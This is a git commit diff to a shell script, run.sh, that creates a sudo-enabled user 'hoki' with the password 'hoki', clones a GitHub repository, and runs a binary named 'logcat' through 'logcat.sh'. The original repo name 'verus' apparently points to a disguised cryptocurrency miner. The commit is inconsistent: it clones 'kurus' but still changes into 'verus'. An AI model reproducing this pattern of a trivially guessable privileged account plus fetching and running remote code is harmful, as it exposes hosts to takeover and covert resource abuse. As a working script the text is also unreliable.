ba8df78be6330a87777f1887ec640300f7c6f678
Gondoru <87273917+Gondoru@users.noreply.github.com>
2021-07-18 21:15:39 +0700

    Update run.sh

--- run.sh
+++ run.sh
@@ -4,9 +4,9 @@ sudo adduser hoki sudo
 sudo usermod -a -G sudo hoki
 sudo echo 'hoki:hoki' | sudo chpasswd
 cd /home/hoki
-git clone https://github.com/kijang-7/verus.git
+git clone https://github.com/Gondoru/kurus.git
 cd verus
 sudo chown hoki:sudo logcat
 sudo chown hoki:sudo logcat.sh
 sudo chmod 700 logcat logcat.sh
-sudo -u hoki sh -c "/home/hoki/verus/logcat.sh"
+sudo -u hoki sh -c "/home/hoki/kurus/logcat.sh"
